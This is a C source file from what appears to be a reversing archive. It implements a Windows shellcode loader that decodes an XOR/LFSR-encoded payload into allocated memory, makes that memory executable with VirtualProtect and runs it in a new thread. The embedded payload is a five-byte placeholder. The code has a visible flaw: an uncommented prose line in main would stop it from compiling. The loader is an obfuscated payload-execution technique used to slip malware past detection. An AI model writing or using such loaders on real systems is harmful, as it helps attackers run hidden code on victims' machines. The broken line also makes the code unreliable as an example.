/*
    Shellcode Loader
    Archive of Reversing.ID

    Custom encoding.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    XOR single key with LFSR
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>

/*
    Encoded shellcode format:
        [SEED] [ENCODED SHELLCODE]
*/

/*
    dst: buffer which will receive the decoded shellcode
    src: buffer which store encoded shellcode
    size: the size of encoded buffer.
*/
void transform (uint8_t * dst, uint8_t * src, size_t size)
{
    uint8_t taps[] = { 8, 6, 5, 4 };
    uint8_t state = src[0];
    uint8_t feedback;
    size_t  i = 0, j = 0;
    
    src  += 1;
    size -= 1;

    for (i = 0; i < size; i++)
    {
        // generate value from LFSR
        feedback = 0;
        for (j = 0; j < 4; j++)
            feedback ^= (state >> (taps[j] - 1)) & 1;

        feedback ^= (state ^ (state >> 3)) & 1;
        state = ((state << 1) | feedback) & 0xFF;

        // XOR with shellcode byte
        dst[i] = src[i] ^ state;
    }
}

int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stackz
    uint8_t     payload []  = { 0x84,0x99,0x83,0xea,0x8e };
    uint32_t    payload_len = 5;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len - 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    decode payload and store to allocated buffer
    transform ((uint8_t*)runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}